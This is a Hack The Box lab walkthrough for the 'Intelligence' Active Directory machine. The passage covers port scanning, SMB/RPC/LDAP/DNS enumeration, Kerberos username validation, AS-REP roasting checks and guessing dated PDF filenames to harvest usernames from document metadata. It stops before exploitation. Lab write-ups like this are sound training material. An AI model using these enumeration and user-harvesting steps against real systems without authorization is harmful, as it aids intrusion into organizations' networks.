# Hack The Box - Intelligence Walkthrough 

The [Intelligence](https://app.hackthebox.com/machines/Intelligence) machine is a medium Windows Machine with a strong focus on Active Directory enumeration and exploitation. This box is really interesting, it shows some exploitation paths that are not always common like ADIDNS abuse or GMSA passwords.

If you didn’t solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.

## Reconnaissance
In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address.


### Nmap scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.248             
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-26 08:32 EST
Nmap scan report for 10.10.10.248
Host is up (0.26s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-26 20:33:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-26T20:34:33+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T20:22:42
|_Not valid after:  2025-01-25T20:22:42
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T20:22:42
|_Not valid after:  2025-01-25T20:22:42
|_ssl-date: 2024-01-26T20:34:34+00:00; +7h00m05s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-26T20:34:33+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T20:22:42
|_Not valid after:  2025-01-25T20:22:42
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-26T20:34:34+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2024-01-26T20:22:42
|_Not valid after:  2025-01-25T20:22:42
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-26T20:33:56
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m04s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.62 seconds
```

Rustscan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ rustscan -a 10.10.10.248 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.248:53
Open 10.10.10.248:88
Open 10.10.10.248:80
Open 10.10.10.248:135
Open 10.10.10.248:139
Open 10.10.10.248:389
Open 10.10.10.248:445
Open 10.10.10.248:464
Open 10.10.10.248:593
Open 10.10.10.248:636
Open 10.10.10.248:3268
Open 10.10.10.248:3269
Open 10.10.10.248:5985
Open 10.10.10.248:9389
Open 10.10.10.248:49667
Open 10.10.10.248:49694
Open 10.10.10.248:49684
Open 10.10.10.248:49683
Open 10.10.10.248:49737
Open 10.10.10.248:50770
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,88,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49694,49684,49683,49737,50770 10.10.10.248

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-26 08:38 EST
Initiating Ping Scan at 08:38
Scanning 10.10.10.248 [2 ports]
Completed Ping Scan at 08:38, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:38
Completed Parallel DNS resolution of 1 host. at 08:38, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:38
Scanning 10.10.10.248 [20 ports]
Discovered open port 53/tcp on 10.10.10.248
Discovered open port 445/tcp on 10.10.10.248
Discovered open port 88/tcp on 10.10.10.248
Discovered open port 80/tcp on 10.10.10.248
Discovered open port 3268/tcp on 10.10.10.248
Discovered open port 139/tcp on 10.10.10.248
Discovered open port 135/tcp on 10.10.10.248
Discovered open port 3269/tcp on 10.10.10.248
Discovered open port 9389/tcp on 10.10.10.248
Discovered open port 49667/tcp on 10.10.10.248
Discovered open port 5985/tcp on 10.10.10.248
Discovered open port 49684/tcp on 10.10.10.248
Discovered open port 464/tcp on 10.10.10.248
Discovered open port 50770/tcp on 10.10.10.248
Discovered open port 389/tcp on 10.10.10.248
Discovered open port 49683/tcp on 10.10.10.248
Discovered open port 49737/tcp on 10.10.10.248
Discovered open port 49694/tcp on 10.10.10.248
Discovered open port 593/tcp on 10.10.10.248
Discovered open port 636/tcp on 10.10.10.248
Completed Connect Scan at 08:38, 0.51s elapsed (20 total ports)
Nmap scan report for 10.10.10.248
Host is up, received syn-ack (0.26s latency).
Scanned at 2024-01-26 08:38:36 EST for 0s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49683/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49737/tcp open  unknown          syn-ack
50770/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
```

Enumerating SMB service (Crackmapexec)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248                                            
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 --shares
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u '' -p ''
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\: STATUS_ACCESS_DENIED 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u '' -p '' --shares
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\: STATUS_ACCESS_DENIED 
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ crackmapexec smb 10.10.10.248 --pass-pol          
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

Enumerating `msrpc` service (RPCclient)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ rpcclient 10.10.10.248 -U '' -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

Enumerating LDAP service (ldapsearch)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ ldapsearch -H ldap://10.10.10.248 -x -b "DC=intelligence,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Enumerating sub-domains (DNSenum)

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt intelligence.htb                      

dnsenum VERSION:1.2.6

-----   intelligence.htb   -----

Host's addresses:
__________________

intelligence.htb.                        600      IN    A        10.10.10.248

                                                                                                                                                                                                                                                            
Name Servers:                                                                                                                                                                                                                                               
______________                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                            
dc.intelligence.htb.                     3600     IN    A        10.10.10.248                                                                                                                                                                               

                                                                                                                                                                                                                                                            
Mail (MX) Servers:                                                                                                                                                                                                                                          
___________________                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                            
Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                                                            
_________________________________________________                                                                                                                                                                                                           
                                                                                                                                                                                                                                                            
unresolvable name: dc.intelligence.htb at /usr/bin/dnsenum line 900.                                                                                                                                                                                        
                                                                                                                                                                                                                                                            
Trying Zone Transfer for intelligence.htb on dc.intelligence.htb ... 
AXFR record query failed: no nameservers

                                                                                                                                                                                                                                                            
Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:                                                                                                                                                                     
________________________________________________________________________________________                                                                                                                                                                    
                                                                                                                                                                                                                                                            
dc.intelligence.htb.                     3600     IN    A        10.10.10.248
domaindnszones.intelligence.htb.         600      IN    A        10.10.10.248
forestdnszones.intelligence.htb.         600      IN    A        10.10.10.248

intelligence.htb class C netranges:
____________________________________

Performing reverse lookup on 0 ip addresses:
_____________________________________________

0 results out of 0 IP addresses.

intelligence.htb ip blocks:
____________________________

done.
```

Found the same `dc.intelligence.htb` domain as found in nmap scan.

Visiting the website, I found nothing but just two `pdf` files with just gibberish

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.55
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:01:26 11:10:04-05:00
File Access Date/Time           : 2024:01:26 11:10:04-05:00
File Inode Change Date/Time     : 2024:01:26 11:10:04-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.55
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:01:26 11:10:27-05:00
File Access Date/Time           : 2024:01:26 11:10:27-05:00
File Inode Change Date/Time     : 2024:01:26 11:10:27-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

Directory Bruteforcing using FerroxBuster 

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ feroxbuster -u http://intelligence.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/feroxbuster-intelligence.htb-raft-med-lowercase
^[[C
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intelligence.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ scans/feroxbuster-intelligence.htb-raft-med-lowercase
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       56l      165w     1850c http://intelligence.htb/documents/scripts.js
200      GET        1l       44w     2532c http://intelligence.htb/documents/jquery.easing.min.js
200      GET      208l      768w    47856c http://intelligence.htb/documents/2020-01-01-upload.pdf
200      GET      209l      800w    48542c http://intelligence.htb/documents/2020-12-15-upload.pdf
200      GET      106l      659w    26989c http://intelligence.htb/documents/demo-image-01.jpg
200      GET        8l       29w    28898c http://intelligence.htb/documents/favicon.ico
200      GET        7l     1031w    84152c http://intelligence.htb/documents/bootstrap.bundle.min.js
200      GET        2l     1297w    89476c http://intelligence.htb/documents/jquery.min.js
403      GET       29l       92w     1233c http://intelligence.htb/documents/
200      GET      492l     2733w   186437c http://intelligence.htb/documents/demo-image-02.jpg
301      GET        2l       10w      157c http://intelligence.htb/documents => http://intelligence.htb/documents/
200      GET    10345l    19793w   190711c http://intelligence.htb/documents/styles.css
200      GET        0l        0w  1194960c http://intelligence.htb/documents/all.js
200      GET      129l      430w     7432c http://intelligence.htb/
400      GET        6l       26w      324c http://intelligence.htb/error%1F_log
400      GET        6l       26w      324c http://intelligence.htb/documents/error%1F_log
[####################] - 2m     53185/53185   0s      found:16      errors:0      
[####################] - 2m     26584/26584   190/s   http://intelligence.htb/ 
[####################] - 2m     26584/26584   191/s   http://intelligence.htb/documents/
```

Found a `/documents` directory but access was forbidden.

Next, I tried to check the two username found in the `exiftool` data if they’re valid against Kerberos with [`kerbrute`](https://github.com/ropnop/kerbrute), and both come back as valid usernames on the domain:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/27/24 - Ronnie Flathers @ropnop

2024/01/27 00:32:34 >  Using KDC(s):
2024/01/27 00:32:34 >   10.10.10.248:88

2024/01/27 00:32:34 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/01/27 00:32:34 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/01/27 00:32:34 >  Done! Tested 2 usernames (2 valid) in 0.262 seconds
```

With two usernames, I can check to see if either has the `don’t require preauth flag` set, which would leak the users hash (this is AS-REP-roasting), but neither is set that way:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Jose.Williams
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for Jose.Williams
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/William.Lee 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for William.Lee
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Now that, there’s no other enumeration option, I went back to the `file upload` thing in the `/document` directory. Looking at the `YYYY-MM-DD-upload.pdf` format, i thought of trying to see if any other file that exist on any other date.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ for i in $(seq 1122 1487); do date --date="$i day ago" +%Y-%m-%d-upload.pdf; done
2020-12-31-upload.pdf
2020-12-30-upload.pdf
2020-12-29-upload.pdf
2020-12-28-upload.pdf
2020-12-27-upload.pdf
2020-12-26-upload.pdf
2020-12-25-upload.pdf
...
SNIP
...
2020-01-08-upload.pdf
2020-01-07-upload.pdf
2020-01-06-upload.pdf
2020-01-05-upload.pdf
2020-01-04-upload.pdf
2020-01-03-upload.pdf
2020-01-02-upload.pdf
2020-01-01-upload.pdf
```

Here `1122` is the number of days to reach `31st december, 2020` and `1487` is just 365 days, covering the entire year of 2020, to create a file list.

 

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ for i in $(cat ../files); do wget http://10.10.10.248/documents/$i; done 
--2024-01-27 01:28:39--  http://10.10.10.248/documents/2020-12-31-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2024-01-27 01:28:40 ERROR 404: Not Found.

--2024-01-27 01:28:40--  http://10.10.10.248/documents/2020-12-30-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 25109 (25K) [application/pdf]
Saving to: ‘2020-12-30-upload.pdf’

2020-12-30-upload.pdf                                          100%[====================================================================================================================================================>]  24.52K  99.9KB/s    in 0.2s    

2024-01-27 01:28:41 (99.9 KB/s) - ‘2020-12-30-upload.pdf’ saved [25109/25109]

--2024-01-27 01:28:41--  http://10.10.10.248/documents/2020-12-29-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2024-01-27 01:28:41 ERROR 404: Not Found.

--2024-01-27 01:28:41--  http://10.10.10.248/documents/2020-12-28-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11480 (11K) [application/pdf]
Saving to: ‘2020-12-28-upload.pdf’

2020-12-28-upload.pdf                                          100%[====================================================================================================================================================>]  11.21K  --.-KB/s    in 0s      

2024-01-27 01:28:42 (963 MB/s) - ‘2020-12-28-upload.pdf’ saved [11480/11480]

......
......
SNIP
......
......
2024-01-27 01:31:56 (108 KB/s) - ‘2020-01-02-upload.pdf’ saved [27002/27002]

--2024-01-27 01:31:56--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf                                          100%[====================================================================================================================================================>]  26.21K   107KB/s    in 0.2s    

2024-01-27 01:31:57 (107 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]
```

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ exiftool *.pdf | awk -F: '{print $1}' | sort -u
======== 2020-04-04-upload.pdf
======== 2020-04-15-upload.pdf
======== 2020-04-23-upload.pdf
======== 2020-05-01-upload.pdf
======== 2020-05-03-upload.pdf
======== 2020-05-07-upload.pdf
======== 2020-05-11-upload.pdf
======== 2020-05-17-upload.pdf
======== 2020-05-20-upload.pdf
======== 2020-05-21-upload.pdf
======== 2020-05-24-upload.pdf
======== 2020-05-29-upload.pdf
======== 2020-06-02-upload.pdf
======== 2020-06-03-upload.pdf
======== 2020-06-04-upload.pdf
======== 2020-06-07-upload.pdf
======== 2020-06-08-upload.pdf
======== 2020-06-12-upload.pdf
======== 2020-06-14-upload.pdf
======== 2020-06-15-upload.pdf
======== 2020-06-21-upload.pdf
======== 2020-06-22-upload.pdf
======== 2020-06-25-upload.pdf
======== 2020-06-26-upload.pdf
======== 2020-06-28-upload.pdf
======== 2020-06-30-upload.pdf
======== 2020-07-02-upload.pdf
======== 2020-07-06-upload.pdf
======== 2020-07-08-upload.pdf
======== 2020-07-20-upload.pdf
======== 2020-07-24-upload.pdf
======== 2020-08-01-upload.pdf
======== 2020-08-03-upload.pdf
======== 2020-08-09-upload.pdf
======== 2020-08-19-upload.pdf
======== 2020-08-20-upload.pdf
======== 2020-09-02-upload.pdf
======== 2020-09-04-upload.pdf
======== 2020-09-05-upload.pdf
======== 2020-09-06-upload.pdf
======== 2020-09-11-upload.pdf
======== 2020-09-13-upload.pdf
======== 2020-09-16-upload.pdf
======== 2020-09-22-upload.pdf
======== 2020-09-27-upload.pdf
======== 2020-09-29-upload.pdf
======== 2020-09-30-upload.pdf
======== 2020-10-05-upload.pdf
======== 2020-10-19-upload.pdf
======== 2020-11-01-upload.pdf
======== 2020-11-03-upload.pdf
======== 2020-11-06-upload.pdf
======== 2020-11-10-upload.pdf
======== 2020-11-11-upload.pdf
======== 2020-11-13-upload.pdf
======== 2020-11-24-upload.pdf
======== 2020-11-30-upload.pdf
======== 2020-12-10-upload.pdf
======== 2020-12-15-upload.pdf
======== 2020-12-20-upload.pdf
======== 2020-12-24-upload.pdf
======== 2020-12-28-upload.pdf
======== 2020-12-30-upload.pdf
   63 image files read
Creator                         
Directory                       
ExifTool Version Number         
File Access Date/Time           
File Inode Change Date/Time     
File Modification Date/Time     
File Name                       
File Permissions                
File Size                       
File Type                       
File Type Extension             
Linearized                      
MIME Type                       
Page Count                      
PDF Version
```

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ exiftool *.pdf | grep Creator
Creator                         : Danny.Matthews
Creator                         : David.Reed
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : Jason.Wright
Creator                         : Jose.Williams
Creator                         : Daniel.Shelton
Creator                         : Brian.Morris
Creator                         : Jennifer.Thomas
Creator                         : Thomas.Valenzuela
Creator                         : Travis.Evans
Creator                         : Samuel.Richardson
Creator                         : Richard.Williams
Creator                         : David.Mcbride
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : William.Lee
Creator                         : Anita.Roberts
Creator                         : Brian.Baker
Creator                         : Jose.Williams
Creator                         : David.Mcbride
Creator                         : Kelly.Long
Creator                         : John.Coleman
Creator                         : Jose.Williams
Creator                         : Nicole.Brock
Creator                         : Thomas.Valenzuela
Creator                         : David.Reed
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jason.Patterson
Creator                         : Thomas.Valenzuela
Creator                         : David.Mcbride
Creator                         : Darryl.Harris
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : David.Reed
Creator                         : Nicole.Brock
Creator                         : David.Mcbride
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : John.Coleman
Creator                         : David.Wilson
Creator                         : Scott.Scott
Creator                         : Teresa.Williamson
Creator                         : John.Coleman
Creator                         : Veronica.Patel
Creator                         : John.Coleman
Creator                         : Samuel.Richardson
Creator                         : Ian.Duncan
Creator                         : Nicole.Brock
Creator                         : William.Lee
Creator                         : Jason.Wright
Creator                         : Travis.Evans
Creator                         : David.Mcbride
Creator                         : Jessica.Moody
Creator                         : Ian.Duncan
Creator                         : Jason.Wright
Creator                         : Richard.Williams
Creator                         : Tiffany.Molina
Creator                         : Jose.Williams
Creator                         : Jessica.Moody
Creator                         : Brian.Baker
Creator                         : Anita.Roberts
Creator                         : Teresa.Williamson
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jose.Williams
Creator                         : Stephanie.Young
Creator                         : Samuel.Richardson
Creator                         : Tiffany.Molina
Creator                         : Ian.Duncan
Creator                         : Kelly.Long
Creator                         : Travis.Evans
Creator                         : Ian.Duncan
Creator                         : Jose.Williams
Creator                         : David.Wilson
Creator                         : Thomas.Hall
Creator                         : Ian.Duncan
Creator                         : Jason.Patterson
```

```bash
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/intelligence/upload-files]
└─$ exiftool *.pdf | grep Creator | awk  '{print $3}' 
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Jason.Patterson
```

Using `kerbrute` to valid these users.

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/intelligence]
└─$ /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/27/24 - Ronnie Flathers @ropnop

2024/01/27 01:42:06 >  Using KDC(s):
2024/01/27 01:42:06 >   10.10.10.248:88

2024/01/27 01:42:06 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2024/01/27 01:42:06 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
